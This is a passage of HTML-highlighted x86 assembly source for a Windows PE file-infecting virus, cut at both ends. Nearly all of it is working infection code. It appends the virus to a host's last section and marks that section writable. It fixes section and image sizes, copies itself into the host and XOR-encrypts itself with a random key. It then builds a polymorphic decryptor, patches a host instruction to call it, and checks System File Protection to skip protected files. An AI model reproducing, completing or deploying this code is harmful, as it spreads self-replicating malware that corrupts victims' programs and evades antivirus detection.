    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">             </span><span class="sc1">;restore pointer to code section header</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">eax</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">14h</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">mapbase</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">;goto section raw data</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">ScanAndPatch</span><span class="sc0">
    </span><span class="sc6">jc</span><span class="sc0">  </span><span class="sc5">____2</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">             </span><span class="sc1">;restore stack</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">ExitWithoutInfection</span><span class="sc0">
</span><span class="sc5">____2</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">;get pe header</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">6h</span><span class="sc4">]</span><span class="sc0">      </span><span class="sc1">;get number of sections</span><span class="sc0">
    </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,[</span><span class="sc8">eax</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">74h</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">shl</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc2">3h</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">78h</span><span class="sc0">
</span><span class="sc5">@nexts2</span><span class="sc4">:</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">28h</span><span class="sc0">
    </span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc5">@nexts2</span><span class="sc0">             </span><span class="sc1">;goto last section header</span><span class="sc0">
    </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">24h</span><span class="sc4">],</span><span class="sc2">0C0000000h</span><span class="sc0">      </span><span class="sc1">;set section flags to readable\writeable</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">8h</span><span class="sc4">],</span><span class="sc5">VirusSize</span><span class="sc0">  </span><span class="sc1">;add virus size to section virtual size</span><span class="sc0">
    </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebx</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">8h</span><span class="sc4">]</span><span class="sc0">          </span><span class="sc1">;get section new virtual size</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">;get pe header</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,[</span><span class="sc8">ecx</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">3ch</span><span class="sc4">]</span><span class="sc0">         </span><span class="sc1">;get file alignment</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">             </span><span class="sc1">;\
    xor edx,edx             ; \
    div ecx             ;--&gt;align section size</span><span class="sc0">
    </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">             </span><span class="sc1">; /</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">10h</span><span class="sc4">]</span><span class="sc0">       </span><span class="sc1">;/</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">10h</span><span class="sc4">],</span><span class="sc8">ecx</span><span class="sc0">   </span><span class="sc1">;set new section size of raw data</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">                 
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">FixRVA</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">        </span><span class="sc1">;add VirtualSize-PointerToRawData</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebx</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">0ch</span><span class="sc4">]</span><span class="sc0">         </span><span class="sc1">;subtraction to the virus offset</span><span class="sc0">
    </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebx</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">14h</span><span class="sc4">]</span><span class="sc0">         </span><span class="sc1">;when decrypting and jumping to</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">FixRVA</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">      </span><span class="sc1">;virus at runtime.</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebx</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">14h</span><span class="sc4">]</span><span class="sc0">         </span><span class="sc1">;get section raw data rva</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">mapbase</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">;convert it to va</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebx</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">8h</span><span class="sc4">]</span><span class="sc0">          </span><span class="sc1">;goto end of section</span><span class="sc0">
    </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">VirusSize</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">StartOfDataToEncrypt</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc1">;set the virus start offset</span><span class="sc0">
    </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">GetTickCount</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">XorKey</span><span class="sc4">],</span><span class="sc8">al</span><span class="sc0">  </span><span class="sc1">;set random key</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc0">             </span><span class="sc1">;virus in infected files</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">             </span><span class="sc1">;tick count</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">_main</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc5">VirusSize</span><span class="sc0">
    </span><span class="sc6">rep</span><span class="sc0"> </span><span class="sc6">movsb</span><span class="sc0">               </span><span class="sc1">;copy virus into host</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc5">EncryptedVirus</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc5">EncryptionStart</span><span class="sc0">
</span><span class="sc5">encrypt</span><span class="sc4">:</span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc8">al</span><span class="sc0">
    </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
    </span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc5">encrypt</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">CreateDecryptor</span><span class="sc0">         </span><span class="sc1">;create polymorphic decryptor</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">             </span><span class="sc1">;restore pe header</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebx</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">50h</span><span class="sc4">]</span><span class="sc0">         </span><span class="sc1">;get size of image</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">VirusSize</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,[</span><span class="sc8">ebx</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">38h</span><span class="sc4">]</span><span class="sc0">         </span><span class="sc1">;get section alignment</span><span class="sc0">
    </span><span class="sc6">div</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">             </span><span class="sc1">;align size of image</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">50h</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">   </span><span class="sc1">;set new size of image</span><span class="sc0">
    </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">Infection_Success</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">PadFileSize</span><span class="sc0">
</span><span class="sc5">ExitCloseF</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">CloseFile</span><span class="sc0">
</span><span class="sc5">ExitInfect</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">RestoreFileAttributes</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">ExitWithoutInfection</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">RestoreFileSize</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">CloseFile</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">RestoreFileAttributes</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">
    
    
    </span><span class="sc5">Infection_Success</span><span class="sc0">   </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">
    
</span><span class="sc1">;scan a code for mov eax,fs:[00000000] instruction and </span><span class="sc0">
</span><span class="sc1">;patch it with call virus_decryptor and inc ebx instruction</span><span class="sc0">
</span><span class="sc1">;input:</span><span class="sc0">
</span><span class="sc1">;eax - address of code</span><span class="sc0">
</span><span class="sc1">;ecx - size of code to scan</span><span class="sc0">
</span><span class="sc1">;output:</span><span class="sc0">
</span><span class="sc1">;carry flag - success\fail.</span><span class="sc0">
</span><span class="sc5">ScanAndPatch</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc5">__1</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">],</span><span class="sc2">0a164h</span><span class="sc0">
    </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">nxt_w</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">2h</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">nxt_w</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">],</span><span class="sc2">0e8h</span><span class="sc0">     </span><span class="sc1">;call instruction</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">WhereToWriteDecryptor</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">mapbase</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc2">5h</span><span class="sc0">
    </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">mapbase</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">1h</span><span class="sc4">],</span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">5h</span><span class="sc4">],</span><span class="sc2">43h</span><span class="sc0">     </span><span class="sc1">;inc ebx instruction</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">patchok</span><span class="sc0">             </span><span class="sc1">;patch only one time.</span><span class="sc0">
</span><span class="sc5">nxt_w</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc5">__1</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">nopatch</span><span class="sc0">
</span><span class="sc5">patchok</span><span class="sc4">:</span><span class="sc6">stc</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">nopatch</span><span class="sc4">:</span><span class="sc6">clc</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">
    
</span><span class="sc1">;input:nothing</span><span class="sc0">
</span><span class="sc1">;output:carry flag:</span><span class="sc0">
</span><span class="sc1">;1=protected</span><span class="sc0">
</span><span class="sc1">;0=not protected</span><span class="sc0">
</span><span class="sc5">CheckSFPFile</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">pushad</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">SFP_Check_Error_Handler</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">fs</span><span class="sc4">:[</span><span class="sc8">eax</span><span class="sc4">]</span><span class="sc0">      </span><span class="sc1">;set SEH</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">fs</span><span class="sc4">:[</span><span class="sc8">eax</span><span class="sc4">],</span><span class="sc8">esp</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">SFC_DLL</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">LoadLibrary</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">;load sfc library</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">0h</span><span class="sc0">              </span><span class="sc1">;sfc here ?</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0">  </span><span class="sc5">NotProtected</span><span class="sc0">            </span><span class="sc1">;we not under xp\2000</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">hSfc</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">        </span><span class="sc1">;save module handle</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">_SfcIsFileProtected</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">             </span><span class="sc1">;sfc module handle</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">__GetProcAddress</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">0h</span><span class="sc0">              </span><span class="sc1">;function not founded ?</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0">  </span><span class="sc5">NotProtected</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">SfcIsFileProtected</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">  </span><span class="sc1">;save function address</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">Unicode_Path</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">200h</span><span class="sc0">
</span><span class="sc5">@blankU</span><span class="sc4">:</span><span class="sc6">stosb</span><span class="sc0">                   </span><span class="sc1">;blank unicode buffer</span><span class="sc0">
    </span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc5">@blankU</span><span class="sc0">             </span><span class="sc1">;to avoid errors</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">200h</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">Unicode_Path</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc4">-</span><span class="sc2">1</span><span class="sc0">              </span><span class="sc1">;string is null terminated</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">FileToInfect</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">MultiByteToWideChar</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">;convert path into unicode</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">0h</span><span class="sc0">              </span><span class="sc1">;fail ?</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0">  </span><span class="sc5">SFP_Err</span><span class="sc0">             </span><span class="sc1">;dont infect</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">Unicode_Path</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0h</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">SfcIsFileProtected</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">;check if file is protected</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">0h</span><span class="sc0">              </span><span class="sc1">;is file protected ?</span><span class="sc0">
    </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">SFP_Err</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">hSfc</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">FreeLibrary</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">;free sfc library</span><span class="sc0">
</span><span class="sc5">NotProtected</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">fs</span><span class="sc4">:[</span><span class="sc2">0</span><span class="sc4">]</span><span class="sc0">        </span><span class="sc1">;remove SEH</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc2">4h</span><span class="sc0">
    </span><span class="sc6">popad</span><span class="sc0">
    </span><span class="sc6">stc</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">SFP_Err</span><span class="sc4">:</span><span class="sc0">                    </span><span class="sc1">;if file is protected we here</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">hSfc</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">FreeLibrary</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">;free sfc library </span><span class="sc0">
